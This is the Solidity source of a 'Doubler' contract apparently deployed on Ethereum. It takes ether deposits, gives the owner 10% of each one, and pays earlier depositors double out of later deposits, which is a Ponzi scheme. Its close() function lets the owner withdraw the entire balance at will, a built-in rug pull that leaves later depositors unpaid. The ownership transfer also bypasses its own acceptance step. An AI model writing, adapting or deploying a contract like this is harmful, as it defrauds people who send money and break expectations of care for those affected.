/**

 *Submitted for verification at Etherscan.io on 2020-04-20

*/



//pragma solidity ^0.5.0;
pragma solidity >=0.5 <0.7.17;



library SafeMath {

    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }

    

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;



        return c;

    }

   

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }



        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }

   

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }

  

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        // Solidity only automatically asserts when dividing by 0

        require(b > 0, errorMessage);

        uint256 c = a / b;

        // assert(a == b * c + a % b); // There is no case in which this doesn't hold



        return c;

    }

   

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }



    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}

//owner change function

contract Owned {

    address payable public owner;

    address payable public newOwner;



    event OwnershipTransferred(address payable indexed _from, address payable indexed _to);



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address payable _newOwner) public onlyOwner {

        owner = _newOwner;

    }

    function acceptOwnership() public {

        require(msg.sender == newOwner);

        emit OwnershipTransferred(owner, newOwner);

        owner = newOwner;

        newOwner = address(0);

    }

}





contract Doubler is Owned{



	using SafeMath for uint;



	//address payable public owner;



	struct User {

		address payable addr;

		uint amount;

	}



	User[] public users;

	uint public currentlyPaying = 0;

	uint public totalUsers = 0;

	uint public totalWei = 0;

	uint public totalPayout = 0;

	bool public active;

	uint256 public minAmount=0.10 ether;

	uint256 public maxAmount=0.60 ether;



	constructor() public {

		owner = msg.sender;

		active = true;

	}

	

	function contractActivate() public{

	    require(msg.sender==owner);

	    require(active == false, "Contract is already active");

	    active=true;

	}

	function contractDeactivate() public{

	    require(msg.sender==owner);

	    require(active == true, "Contract must be active");

	    active=false;

	}

	

	function limitAmount(uint256 min , uint256 max) public{

	    require(msg.sender==owner, "Cannot call function unless owner");

	    minAmount=min;

	    maxAmount=max;

	}



	function close() public{

		require(msg.sender == owner, "Cannot call function unless owner");

		require(active == true, "Contract must be active");

		require(address(this).balance > 0, "This contract must have a balane above zero");

		owner.transfer(address(this).balance);

		active = false;

	}



	

	function() external payable{

	    require(active==true ,"Contract must be active");

	    require(msg.value>=minAmount,"Amount is less than minimum amount");

	    require(msg.value<=maxAmount,"Amount Exceeds the Maximum amount");

		users.push(User(msg.sender, msg.value));

		totalUsers += 1;

		totalWei += msg.value;



		owner.transfer(msg.value.div(10));

		while (address(this).balance > users[currentlyPaying].amount.mul(2)) {

			uint sendAmount = users[currentlyPaying].amount.mul(2);

			users[currentlyPaying].addr.transfer(sendAmount);

			totalPayout += sendAmount;

			currentlyPaying += 1;

		}

	}

	

	function join() external payable{

	    require(active==true ,"Contract must be active");

	    require(msg.value>=minAmount,"Amount is less than minimum amount");

	    require(msg.value<=maxAmount,"Amount Exceeds the Maximum amount");

		users.push(User(msg.sender, msg.value));

		totalUsers += 1;

		totalWei += msg.value;



		owner.transfer(msg.value.div(10));

		while (address(this).balance > users[currentlyPaying].amount.mul(2)) {

			uint sendAmount = users[currentlyPaying].amount.mul(2);

			users[currentlyPaying].addr.transfer(sendAmount);

			totalPayout += sendAmount;

			currentlyPaying += 1;

		}

	}

}
